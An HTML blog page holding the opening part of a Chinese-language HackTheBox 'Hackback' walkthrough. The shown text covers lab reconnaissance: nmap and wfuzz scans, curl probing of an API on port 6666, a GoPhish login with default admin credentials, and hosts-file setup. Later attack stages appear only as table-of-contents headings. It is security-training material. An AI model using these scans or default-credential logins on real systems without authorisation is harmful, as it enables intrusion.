@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Hackback - T0x1c</title>
+
+  
+    <meta name="description" content="Hackback是一个非常难的靶机，其中涉及了钓鱼网站、参数模糊测试、日志中毒、HTTP代理、WinRm服务、UserLogger服务、NFTS数据流、恶意dll等知识，总共耗费了我五天时间来攻克和研究，感兴趣的同学可以在HackTheBox中进行学习。我觉得主要难的还是日志相关的那两个点，这是不是和近期log4j2远程代码执行有异曲同工之妙呢？让我们一起来看看。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Hackback">
+<meta property="og:url" content="https://toxic80l.github.io/post/5f3c8f9c/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Hackback是一个非常难的靶机，其中涉及了钓鱼网站、参数模糊测试、日志中毒、HTTP代理、WinRm服务、UserLogger服务、NFTS数据流、恶意dll等知识，总共耗费了我五天时间来攻克和研究，感兴趣的同学可以在HackTheBox中进行学习。我觉得主要难的还是日志相关的那两个点，这是不是和近期log4j2远程代码执行有异曲同工之妙呢？让我们一起来看看。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/1.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/2.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/3.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/4.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/5.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/6.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/7.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/8.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/9.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/10.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/11.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/16.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/24.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/25.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/30.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/31.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/35.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/39.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/40.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/42.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/52.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/55.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/60.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/61.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/62-1.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/62.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/63.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/64.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/65.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/66.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/67.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/68.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/69.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/70.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/71.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/72.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/73.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/74.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/74-1.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/74-2.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/74-3.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/75.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/76.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/77.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/78.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/79.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/80.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/81.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/82.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/83.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/84.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/85.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/86.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/87.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5f3c8f9c/88.png">
+<meta property="article:published_time" content="2021-12-11T10:52:59.000Z">
+<meta property="article:modified_time" content="2021-12-11T15:35:02.415Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="靶机渗透">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="toc-text">80端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6666%E7%AB%AF%E5%8F%A3"><span class="toc-text">6666端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#64831%E7%AB%AF%E5%8F%A3"><span class="toc-text">64831端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99"><span class="toc-text">钓鱼网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2"><span class="toc-text">管理员登录界面</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-simple"><span class="toc-text">0x02 上线[simple]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E6%97%A5%E5%BF%97%E4%B8%AD%E6%AF%92"><span class="toc-text">php日志中毒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%80%9F%E5%8A%A9%E4%BB%A3%E7%90%86%E5%AE%8C%E6%88%90WinRM%E4%B8%8A%E7%BA%BF"><span class="toc-text">借助代理完成WinRM上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-hacker"><span class="toc-text">0x03 权限提升[hacker]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83"><span class="toc-text">查看本地环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-text">查看目录文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%88%90nc%E4%B8%8A%E7%BA%BF"><span class="toc-text">命令注入完成nc上线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96user-txt"><span class="toc-text">读取user.txt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-system"><span class="toc-text">0x04 权限提升[system]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90UserLogger%E6%9C%8D%E5%8A%A1"><span class="toc-text">分析UserLogger服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E8%AF%BB%E5%8F%96root-txt"><span class="toc-text">NTFS数据流读取root.txt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8Fdll%E4%B8%8A%E7%BA%BFsystem"><span class="toc-text">恶意dll上线system</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2021-12-11T10:52:59.000Z">2021-12-11</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Hackback</span></h1>
+<p>Hackback是一个非常难的靶机，其中涉及了钓鱼网站、参数模糊测试、日志中毒、HTTP代理、WinRm服务、UserLogger服务、NFTS数据流、恶意dll等知识，总共耗费了我五天时间来攻克和研究，感兴趣的同学可以在HackTheBox中进行学习。我觉得主要难的还是日志相关的那两个点，这是不是和近期log4j2远程代码执行有异曲同工之妙呢？让我们一起来看看。</p>
+<span id="more"></span>
+<span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/1.png"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>首先通过nmap对目标进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.128 -oA nmap_Hackback</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/2.png"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/3.png"><br>发现目标开放了80、6666、64381端口</p>
+<h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/4.png"><br>网站元素查看可以发现该站点采用 ASP.NET<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/5.png"></p>
+<h4 id="6666端口"><a href="#6666端口" class="headerlink" title="6666端口"></a>6666端口</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.128:6666</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/6.png"><br>提示说缺少命令，尝试通过 wfuzz 来对正确的路径进行模糊测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 http://10.10.10.128:6666/FUZZ</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/7.png"><br>发现了一些路径，首先探测 help</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.128:6666/<span class="built_in">help</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/8.png"><br>在 help 中列出了全部参数，那么接下来测试这些路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.128:6666/hello</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/9.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.128:6666/proc | jq -c .[]</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/10.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.128:6666/whoami</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/11.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.128:6666/list | jq -c .[]</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/12.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.128:6666/services | jq -c .[]</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/13.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://10.10.10.128:6666/netstat | jq -r <span class="string">&#x27;.[] | select(.State=2) | &quot;\(.LocalAddress):\(.LocalPort) [\(.OwningProcess)]&quot;&#x27;</span> | sed <span class="string">&#x27;s/::/0.0.0.0/g&#x27;</span> | sort -n -t<span class="string">&#x27;:&#x27;</span> -k2</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/14.png"><br>经过整理可以看到 hello 返回一条打招呼信息；proc 返回进程列表；whoami 返回当前用户具体信息；list 返回网站目录当中的内容； services 返回服务信息；netstat 返回端口连接情况，相比nmap探测的要多。 </p>
+<h4 id="64831端口"><a href="#64831端口" class="headerlink" title="64831端口"></a>64831端口</h4><p>是一个GoPhish登录界面<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/15.png"><br>通过默认账号密码 admin/gophish 进入<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/16.png"><br>在电子邮件模块下存在五个模块，分别是 Admin、Fackbook、HackTheBox、Paypal、Twitter<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/17.png"><br>点击 Admin 模块，切换到 html 格式，可以发现存在一个域名<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/18.png"><br>点开其他的模块也可以发现不同的域名，经过整理后如下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">admin.hackback.htb</span></span><br><span class="line"><span class="string">www.facebook.htb</span></span><br><span class="line"><span class="string">www.hackthebox.htb</span></span><br><span class="line"><span class="string">www.paypal.htb</span></span><br><span class="line"><span class="string">www.twitter.htb</span></span><br></pre></td></tr></table></figure>
+<p>将它们添加到hosts文件中配置DNS</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line"><span class="comment">##配置</span></span><br><span class="line">10.10.10.128 admin.hackback.htb www.hackthebox.htb www.twitter.htb www.paypal.htb www.facebook.htb</span><br></pre></td></tr></table></figure>
